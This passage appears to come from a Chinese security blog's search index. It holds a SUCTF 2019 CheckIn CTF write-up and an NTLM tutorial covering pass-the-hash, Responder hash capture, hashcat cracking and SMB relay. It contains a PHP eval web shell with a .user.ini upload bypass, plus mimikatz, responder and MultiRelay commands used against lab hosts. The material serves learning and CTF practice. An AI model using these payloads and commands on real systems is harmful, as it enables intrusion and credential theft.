href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>1、文件包含时可以利用php:&#x2F;&#x2F;filter协议来读取文件源码。</strong></p><p><strong>2、data:&#x2F;&#x2F;text&#x2F;paln,可以构造出自己想要的字符串。</strong></p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>发现进行文件内容检测，</p><p>1、过滤了&lt;? </p><p>2、检测了文件头类型  通过添加GIF89a绕过</p><p>3、发现文件后缀名检测ph</p><p>查资料发现绕过&lt;?可以使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过后缀名检测ph。可通过上传user.ini</p><p>payload：</p><p>1、上传user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=cmd.jpg</span><br></pre></td></tr></table></figure><p>2、上传cmd.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>3、蚁剑连接</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>1、后门利用姿势。如果不允许上传.php文件 便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell 。</p><p>2、如果上传点对文件内容进行了检测过滤了&lt;? 那么就可以通过上边的方式进行绕过。</p>]]></content>
      
      
      <categories>
          
          <category> web绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTLM网络身份认证-SMB Relay和PTH</title>
      <link href="/2022/11/13/NTLM%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-SMBRelay%E5%92%8CPTH/"/>
      <url>/2022/11/13/NTLM%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-SMBRelay%E5%92%8CPTH/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前边"><a href="#写在前边" class="headerlink" title="写在前边"></a>写在前边</h2><p>Windows 横向渗透的两种方式。</p><p> 1、<strong>hash传递攻击</strong>，通过传递NTLM-Hash，登录机器，简称PTH；  </p><p> 2、<strong>ticket传递攻击</strong>，通过传递kerberos的ticket，登录机器，简称PTT；  </p><p>这一篇聊一下NTLM协议和PTH攻击</p><p>Windwos平台下目前主要的网络身份认证协议有：NTLM身份认证、kerberos身份认证。NTLM 的网络认证，既可用于域内的认证服务，又可用于工作组环境。NTLM 有 NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​     NTLM网络认证是基于挑战（challenge）&#x2F;响应（Response）认证机制的一种认证模式。由三种消息组成：通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。</p><p>协商：主要用于确认双方协议版本(NTLM v1&#x2F;NTLM V2)。</p><p>质询：就是挑战（Challenge）&#x2F;响应（Response）认证机制起作用的范畴。</p><p>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</p><h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><p>协商时会确定身份认证协议的版本，这里版本分为v1和v2，NTLMv1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash，NTLM v1的Challenge有8位，NTLM v2的Challenge为16位；NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。 </p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256902.png" alt="image-20221114001321581"></p><p>1、首先， 客户端向服务器发送Type1(协商消息)，主要包含客户端请求和服务器支持的功能列表，即协商具体使用哪种认证协议。</p><p>2、服务器在收到Type1(协商消息)后将会与客户端确认具体的认证协议，随后用用Type2 (质询)进行响应，具体做法是server在本地随机生成16字节的字符串，该字符串即为challenge，同时将challenge缓存并发往客户端。</p><p>3、当客户端收到服务器发来的challenge字符串后，会使用所需验证身份的用户的ntlm hash值对challenge进行加密运算得到response并将response，username，challenge封装（Net-NTLM Hash），后一起发送给服务器。</p><p><strong>response非常关键，它可以向服务器证明客户端掌握了正确的账号和密码。</strong></p><p>4、服务器在接收到客户端发来的response后，会用对用用户的ntlm hash值对缓存在本地的challenge进行加密，把得到的结果与接收到的response进行对比，如果相同则验证通过。</p><p><strong>需要注意的是，域环境下会有所不同：</strong></p><p>在域环境下，由于所有域用户的账号密码都存储在域控制器上，因此NTLM协议会稍有不同。    具体来说，域环境下NTLM身份认证前3步与工作组下的一样。第四步服务器在接收到客户端发来的response时，由于自身并没有存储域用户的ntlm hash，因此会将response，username，challenge封装后转发给域控。域控会代替服务进行身份验证，具体做法也是利用自身存储的域用户的ntlm hash对challenge进行加密，将加密结果与response进行比对，如相同则验证通过。</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>1、协商</p><p>主要包含客户端请求和服务器支持的功能列表，即协商具体使用哪种认证协议。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256837.png" alt="image-20221114002204851">2、服务器在收到Type1(协商消息)后将会与客户端确认具体的认证协议，随后用用Type2 (质询)进行响应，具体做法是server在本地随机生成16位的字符串，该字符串即为challenge，同时将challenge缓存并发往客户端。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256407.png" alt="image-20221114002232231"></p><p>3、当客户端收到服务器发来的challenge字符串后，会使用所需验证身份的用户的ntlm hash值对challenge进行加密运算得到response（Net-NTLM Hash），并将response，username，challenge封装后一起发送给服务器</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256180.png" alt="image-20221114002246206"></p><p>4、服务器在接收到客户端发来的response后，会用对用用户的ntlm hash值对缓存在本地的challenge进行加密，把得到的结果与接收到的response进行对比，如果相同则验证通过。</p><h3 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h3><p>具体操作步骤不在这里讲述。</p><p>利用前提：知道目标主机管理员的NTML Hash，或密码一样。2012R2之前版本，无补丁KB2871997。</p><p><strong>原理</strong>：哈希传递就是伪造一个客户端，和正常的NTML认证一样。只是我们用户名对应的NTLM Hash传递到其它主机，给出的 Chanllenge加密，生成一个Response，来完成认证。</p><p><strong>KB2871997补丁绕过：</strong> 但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 抓取AES-<span class="number">256</span>密钥</span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::ekeys&quot;</span></span><br><span class="line"></span><br><span class="line"># 管理员权限运行mimikatz</span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:Administrator /domain:zeo.com /aes256:&lt;AES-256密钥&gt;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="NET-NTLM-Hash"><a href="#NET-NTLM-Hash" class="headerlink" title="NET-NTLM Hash"></a>NET-NTLM Hash</h2><p>Net-NTLM Hash 与 NTLM Hash 不一样。NTLM 认证的第三步中，客户端收到服务端所发出的challenge后，用账号对应的 NTLM-Hash 对其进行加密得到response，并与用户名、Challenge 等一起组合得到 Net-NTLM Hash发往服务器端。Net-NTLM Hash 不能像 NTLM Hash 一样被攻击者用来进行哈希传递，但是攻击者可以使用各种方法截获客户端与 Server 认证过程中的 Net-NTLM Hash，然后对其进行明文爆破，或者直接用来进行 NTLM 中继攻击。</p><p>Net-NTLM Hash v1的格式为：username::hostname:LM response:NTLM response:challenge</p><p>Net-NTLM Hash v2的格式为：username::domain:challenge:HMAC-MD5:blob</p><p>因此我们可以同过上边的NTLM认证过程的数据包进行拼接处Net-NTLM Hash</p><h3 id="wireshark-数据包截取net-ntlm-hash"><a href="#wireshark-数据包截取net-ntlm-hash" class="headerlink" title="wireshark 数据包截取net-ntlm hash"></a>wireshark 数据包截取net-ntlm hash</h3><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256493.png" alt="image-20221114002258755"></p><p>username -&gt;root</p><p>domain -&gt; DESKTOP-G23A1LC</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257329.png" alt="image-20221114002306573"></p><p>challenge -&gt; 6e62a604e8aa692a</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257897.png" alt="image-20221114002318797"></p><p>HMAC-MD5 -&gt;3b245388608f0071bb7c65c8f9a1509f</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257864.png" alt="image-20221114002328944"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blob -&gt; 3b245388608f0071bb7c65c8f9a1509f01010000000000000bf652807defd8016f77a62ff35bc6520000000002001e00570049004e002d005500420054005300350054003700430033004e00440001001e00570049004e002d005500420054005300350054003700430033004e00440004001e00570049004e002d005500420054005300350054003700430033004e00440003001e00570049004e002d005500420054005300350054003700430033004e004400070008000bf652807defd801060004000200000008003000300000000000000001000000002000006d90ca5add36e3b195080970a456a754d9d921de09ebf2f20d6294a50dabca460a001000000000000000000000000000000000000900280063006900660073002f00570049004e002d005500420054005300350054003700430033004e0044000000000000000000</span><br></pre></td></tr></table></figure><p>最后按照格式：username::domain:challenge:HMAC-MD5:blob</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::DESKTOP-G23A1LC:6e62a604e8aa692a:3b245388608f0071bb7c65c8f9a1509f:3b245388608f0071bb7c65c8f9a1509f01010000000000000bf652807defd8016f77a62ff35bc6520000000002001e00570049004e002d005500420054005300350054003700430033004e00440001001e00570049004e002d005500420054005300350054003700430033004e00440004001e00570049004e002d005500420054005300350054003700430033004e00440003001e00570049004e002d005500420054005300350054003700430033004e004400070008000bf652807defd801060004000200000008003000300000000000000001000000002000006d90ca5add36e3b195080970a456a754d9d921de09ebf2f20d6294a50dabca460a001000000000000000000000000000000000000900280063006900660073002f00570049004e002d005500420054005300350054003700430033004e0044000000000000000000</span><br></pre></td></tr></table></figure><h3 id="responder获取net-ntlm-hash"><a href="#responder获取net-ntlm-hash" class="headerlink" title="responder获取net-ntlm hash"></a>responder获取net-ntlm hash</h3><p>上述获取net-ntlm hash 的方法是通过wireshark抓包手动拼接，过程繁琐麻烦。可以通过kali 自带工具responder进行net-ntlm hash 的自动获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I eth0  -v</span><br></pre></td></tr></table></figure><p>利用 sudo responder -I eth0  -v  设置好监听后，就可以在目标主机上键入错误的UNC路径：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257182.png" alt="image-20221114002338729"></p><p>为什么要输入错误的UNC路径？</p><p>在局域网环境下，当用户输入了一个不存在、或者错误的的主机名，或者是在DNS中不存在的主机名时，Windows就会通过利用LLMNR和 NetBIOS名称服务进行查找，最终在局域网内广播LLMNR&#x2F;NBNS数据包来请求解析主机名。而此时我们在局域网内有一台主机权限（攻击机），就可以伪装成受害主机想要访问的机器，从而让受害主机交出相应的登陆凭证。攻击机在此过程中主要是当作一个中间人，去截获客户端的Net-NTLM Hash。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257959.png" alt="image-20221114002348140"></p><h3 id="net-ntlm-hash-的爆破"><a href="#net-ntlm-hash-的爆破" class="headerlink" title="net-ntlm hash 的爆破"></a>net-ntlm hash 的爆破</h3><p>当我们获取到net-ntlm hash后，也可以爆破出明文密码。</p><p><strong>hashcat [option]-m：hash-type</strong>，</p><p>-m 5600 对应NetNTLMv2，详细参数可查表：<a href="https://hashcat.net/wiki/doku.php-o%EF%BC%9A">https://hashcat.net/wiki/doku.php-o：</a></p><p>-o输出文件字典文件为</p><p>–force代表强制执行，测试系统不支持Intel OpenCL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">5600</span> administrator::DESKTOP-G23A1LC:a14d02a3df2ac807:607be7719d9413676e722eba57e402cd:607be7719d9413676e722eba57e402cd0101000000000000f03f05877defd801e89b718cde0a49ae0000000002001e00570049004e002d005500420054005300350054003700430033004e00440001001e00570049004e002d005500420054005300350054003700430033004e00440004001e00570049004e002d005500420054005300350054003700430033004e00440003001e00570049004e002d005500420054005300350054003700430033004e00440007000800f03f05877defd801060004000200000008003000300000000000000001000000002000006d90ca5add36e3b195080970a456a754d9d921de09ebf2f20d6294a50dabca460a001000000000000000000000000000000000000900280063006900660073002f00570049004e002d005500420054005300350054003700430033004e0044000000000000000000 top100.txt -o res1.txt --force</span><br><span class="line">cat res1.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257472.png" alt="image-20221114002408729"></p><h3 id="net-ntlm-hash-relay-中继攻击"><a href="#net-ntlm-hash-relay-中继攻击" class="headerlink" title="net-ntlm hash relay (中继攻击)"></a>net-ntlm hash relay (中继攻击)</h3><p>在NTLM Relay中，我们需要截获 Net-NTLM Hash进行重放攻击，从而实现对其他机器的控制控制。对于工作组的机器来说，两台机器的密码需要一致才能成功，对于域用户来说，被欺骗用户（发起请求的用户）需要域管理员组里边的用户才可以，NTLM 中继成功后的权限为被欺骗用户的权限。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257790.png" alt="image-20221114002416614"></p><p><strong>前题：</strong></p><p>在进行smb relay攻击之前，需要确定目标主机没有开启smb signing。</p><p>可以通过RunFinger.py来查看下内网中开放的信息，查看smb签名的情况：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257468.png" alt="image-20221114002426086"></p><p>这里未开启，开启方式：</p><p><a href="https://jingyan.baidu.com/article/a378c960c78d05f228283089.html">https://jingyan.baidu.com/article/a378c960c78d05f228283089.html</a></p><p>在开启了SMB Signing的情况下，在SMB协议利用NTLM SSP进行了身份验证后，后续的所有数据包，都会利用NTLM SSP生成的这个session key进行签名。SMB服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。NTLM SSP在生成session key的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。而relay型的攻击，都是站在一个中间人的位置，我们是不可能知道原始 LM HASH或NT HASH的（如果知道了也就不需要 Relay 这种攻击手法了）。所以，我们是无法计算出来这个session key的，自然也就无法对数据包进行签名。</p><p>利用MultiRelayx.py进行NET-NTLM relay攻击，窃取win10的net-ntlm hash攻击win7。</p><p>win7 IP：192.168.50.128</p><p>kali执行：</p><p>1、 关闭responder对应服务:sudo vim &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf  </p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257165.png" alt="image-20221114002434162"></p><p>2、开启responder嗅探。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -v</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257918.png" alt="image-20221114002445517"></p><p>3、 运行脚本攻击win7。python3 MultiRelay.py -t 192.168.50.128 -u ALL  </p><p>4、 win10上输入错误的UNC  </p><p><img src="/images%5CNTLM%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-SMBRelay%E5%92%8CPTH%5Cimage-20221114002453174.png" alt="image-20221114002453174"></p><p>5、 获取到win7的shell  </p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257713.png" alt="image-20221114002459981"></p><h2 id="实战中利用"><a href="#实战中利用" class="headerlink" title="实战中利用"></a>实战中利用</h2><p>利用场景：获取某台主机权限，无法抓取明文，且密码强度很高，无法破解。我们可以尝试使用PTH或者NTLM中继攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/11/13/hello-world/"/>
      <url>/2022/11/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
